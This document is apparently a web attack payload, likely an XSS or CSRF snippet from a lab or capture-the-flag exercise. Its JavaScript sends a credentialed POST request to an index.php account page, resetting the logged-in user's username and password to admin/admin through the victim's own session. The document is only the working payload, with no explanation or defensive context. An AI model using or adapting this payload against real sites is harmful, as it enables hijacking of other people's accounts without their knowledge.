let xhr = new XMLHttpRequest();

xhr.open('POST', `${origin}/index.php?page=account.php`);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;

let data = `username=admin&password=admin`

xhr.send(data);

xhr.onload = function() {
  if (xhr.status != 200) {
    console.log(`Error ${xhr.status}: ${xhr.statusText}`);
  } else {
    console.log(`Done!`);
  }
};

// xhr.onerror = function() {
//   console.log("Request failed");
// };
